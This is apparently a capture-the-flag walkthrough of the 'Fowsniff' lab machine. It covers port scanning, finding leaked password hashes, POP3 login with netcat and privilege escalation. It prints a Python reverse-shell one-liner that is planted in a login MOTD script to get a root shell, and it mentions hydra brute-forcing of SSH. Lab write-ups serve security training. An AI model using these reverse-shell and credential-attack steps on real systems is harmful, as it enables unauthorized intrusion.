Lets start off with this machine.
Its a simple machine and hints are on the way.
IP: 10.10.68.237

First we will start off by scanning the ports.

-> nmap -A -T4 10.10.68.237

We found a lot of ports opened now lets try to enumerate all of them one by one.
As you can see ssh is open so if we tend to exploit any username or password we can try to login through it.

Using Google, can you find any public information about them?

As you can see that they have something publicly available so I found this line on their website.

There was breach happened earlier on their systems and now all the users have changed their passwords.But I think there might be someone
who forgot to do this.
The attackers were also able to hijack our official @fowsniffcorp Twitter account. All of our official tweets have been deleted and the attackers may release sensitive information via this medium. We are working to resolve this at soon as possible.

See they have twitter account so I searched for their account and found something amazing.


FowSniffCorp Pwned!

 - too bad I'm dumping all your passwords!
FowsniffCorp - Pastebin.com
Pastebin.com is the number one paste tool since 2002. Pastebin is a website where you can store text online for a set period of time.

So I was able to get the hashes.

Fowsniff Corporation Passwords LEAKED!
FOWSNIFF CORP PASSWORD DUMP!
 
Here are their email passwords dumped from their databases.
They left their pop3 server WIDE OPEN, too!
 
MD5 is insecure, so you shouldn't have trouble cracking them but I was too lazy haha =P

So got the password for all the hashes except stone(You can crack the hashes at Crackstaion).

So I used hydra first to brute force ssh but no luck.. :(

So then I went for pop3 server and it gave me a positive result ..Thank god : )

I am going to be using netcat to connect to pop3 server with these credentials.

Dear All,

A few days ago, a malicious actor was able to gain entry to
our internal email systems. The attacker was able to exploit
incorrectly filtered escape characters within our SQL database
to access our login credentials. Both the SQL and authentication
system used legacy methods that had not been updated in some time.

We have been instructed to perform a complete internal system
overhaul. While the main systems are "in the shop," we have
moved to this isolated, temporary server that has minimal
functionality.

This server is capable of sending and receiving emails, but only
locally. That means you can only send emails to other users, not
to the world wide web. You can, however, access this system via 
the SSH protocol.

The temporary password for SSH is "##############"

You MUST change this password as soon as possible, and you will do so under my
guidance. I saw the leak the attacker posted online, and I must say that your
passwords were not very secure.

Come see me in my office at your earliest convenience and we'll set it up.

Thanks,
A.J Stone

So some of them have their password as mentioned above and I tried for seina but it failed.

So made a list of users

Lets try to gain root shell : )

Actually the question was any file related to the users group.

This cube.sh is the file that gets displayed when we try to login via ssh
So lets see the file and edit some contents in it to get a reverse shell.

sh /opt/cube/cube.sh
baksteen@fowsniff:/etc/update-motd.d$ 


See we can get reverse shell as root.

python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((<IP>,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

I will be using python3 to get a reverse shell.

Now I will again try to connect to ssh and I fired up netcat listener at port 1234
